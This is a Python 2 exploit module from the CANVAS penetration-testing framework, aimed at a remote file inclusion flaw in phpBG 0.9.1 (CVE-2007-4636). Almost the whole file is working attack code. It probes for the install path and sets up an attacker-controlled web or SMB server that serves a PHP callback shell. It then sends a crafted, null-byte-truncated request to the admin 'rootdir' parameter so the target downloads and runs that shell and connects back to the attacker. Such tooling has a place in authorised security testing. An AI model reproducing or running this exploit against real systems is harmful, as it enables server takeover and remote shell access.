#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")


from exploitutils import *
from tcpexploit import tcpexploit

NAME="phpBG Remote file inclusion"
DESCRIPTION="Poor input validation allows remote users to include remote files"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="phpbg"
DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "CVE-2007-4636"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4636"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "Web Exploits"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux"] ]
PROPERTY['VERSION'] = [ "All" ]

NOTES="""
Web         : http://packetstorm.iamthebrain.com/filedesc/phpbg-rfi.txt.html
Application : phpBG 0.9.1
Vendor      : http://sourceforge.net/project/downloading.php?group_id=147682&use_mirror=superb-west&filename=phpbg-0.9.1.tar.gz&78818370

Requires    : Magic_quotes_gpc=Off; Register_globals=On;
---
Gui test: set webserverport to a local port to set up a local webserver for the remote file to be included from.

commandline test:
~/CANVAS $ python exploits/php_includetest/php_includetest.py -t 10.10.10.51 -O webserverport:8000 -l 10.10.10.6 -d 5555 -v 1 -p 8008

Setting webserverport to 0 uses SMB (which doesn't seem to work on my Linux apache)
"""

CHANGELOG="""

"""
import canvasengine
from libs import spkproxy
import urllib
import smbserver

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port=80
        self.host=""
        self.shellcode="\xcc" * 298
        self.badstring="\x00"
        self.setVersions()
        self.version=1
        self.done=0
        self.name=NAME    
        self.basepath="/"
        self.command=None #none by default. We want to try to automatically load MOSDEF
        self.webserverport=80
        self.server=None 
        self.phpfilename="test.php"
        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        self.basepath=self.argsDict.get("basepath",self.basepath)
        self.command=self.argsDict.get("command",self.command)
        self.ssl=self.argsDict.get("ssl",self.ssl)
        self.webserverport=int(self.argsDict.get("webserverport", self.webserverport))
        return 
    
    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        self.versions[1]=["phpBG 0.9.1"]

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]
        
    def test(self):
        """
        Quicky banner check, looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)
        #automatically check out some common basepaths, starting with the one specified
        for basepath in [self.basepath, "/phpbg", "/bg","/"]:
            self.log("Testing for basepath: %s"%basepath)
            ret=self.bannerchecktest({"phpBG":1}, sendstr="GET %s/README HTTP/1.0\r\n\r\n"%basepath)
            if ret:
                self.log("Found basepath of %s"%basepath)
                self.argsDict["basepath"]=basepath
                self.basepath=basepath
                return ret
        return 0
    
    def set_up_webserver(self):
        """
        Creates a webserver that always returns our php callback shell
        as any file you request from it
        """
        data=self.get_php_to_mosdef()
        app=self.engine.getModuleExploit("httpserver")
        app.link(self)
        app.argsDict["port"]=self.webserverport 
        app.argsDict["singleexploit"]="upload"
        app.argsDict["sourcedata"]=data 
        ret=app.listen()
        self.server=app 
        return ret
    
    def set_up_smb_server(self):

        self.log("Starting smb server")
        mysmbserver=smbserver.SMBServer("0.0.0.0", 445)
        mysmbserver.set_file_data(self.phpfilename, self.get_php_to_mosdef()) #load the file data up
        mysmbserver.timeout=5
        if mysmbserver.listen() == 0:
            self.log("Could not listen!")
            return False 
        
        self.server=mysmbserver
        self.log("Accepting connections via SMB for files")
        return True  

    def run(self):
        self.getargs()
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("No test function :<")
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        if self.webserverport:
            ret=self.set_up_webserver()
            if not ret:
                self.log("Could not set up webserver - aborting")
                return 0
            self.log("Set up webserver for return connection")
        else:
            self.log("Setting up smb server")
            ret=self.set_up_smb_server()
            if not ret:
                self.log("Could not set up smb server!")
                return 0
            
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s=self.gettcpsock()
            s.connect((self.host, self.port))
            self.websend(s,sploitstring)
            self.log("Sent attack - looking to accept connection")
            gotconnection=False 
            while self.server.accept():
                gotconnection=True
                
            if gotconnection:
                self.log("Found callback connection to our server")
            else:
                self.log("Did not get a callback to our server")
                data=self.webrecv(s)
                self.log("Got data:%s"%prettyprint(data))
                    
        except:
            import traceback
            traceback.print_exc(file=sys.stdout)
            self.log("Attack reported no open socket - service died?")
            self.setInfo("%s attacking %s:%d - done (failed?)"%(NAME,self.host,self.port))
            return 0
        ret=self.ISucceeded()
        if ret:
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
        return ret
    
    def get_php_to_mosdef(self):
        """
        Creates a string which when included in php's eval() will download and execute
        MOSDEF
        """
        
        localhost=self.callback.ip
        localport=self.callback.port
        self.log("Using PHPMULTI callback of %s:%d"%(localhost,localport))
        #ret="touch /tmp/canvas" #tester
        from phplistener import get_php_stage1 #get our "Shellcode"
        
        #cannot use / in this code (theoretically)
        badchars="/"
        ret="<? "+get_php_stage1(badchars,localhost,localport)+" ?>"
        self.log("Generated callback shell of: %s"%ret)
        return ret
        
    def makesploit(self):


        sploitstring=""
        
        #escapestring=urllib.quote_plus("\";passthru(\'")
        #add quote and semicolon to front of it
        #command="\";"+self.get_php_to_mosdef()
        if self.webserverport:
            command="http://%s:%d/test.php"%(self.callback.ip, self.webserverport)
        else:

            command="\\\\%s\\%s"%(self.callback.ip,self.phpfilename)
            self.log("using smb server path: %s"%command)
        command=urllib.quote_plus(command)
        if self.basepath[-1]=="/": 
            self.basepath=self.basepath[:-1] #strip final / if there
        sploitstring="GET %s/intern/admin/?rootdir=%s\00 HTTP/1.0\r\nHost: localhost\r\nUser-Agent: bob\r\n\r\n"%(self.basepath,command)  
        self.log("Sending: %s"%sploitstring)
        return sploitstring
    
    def shutdown(self):
        self.done=1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    
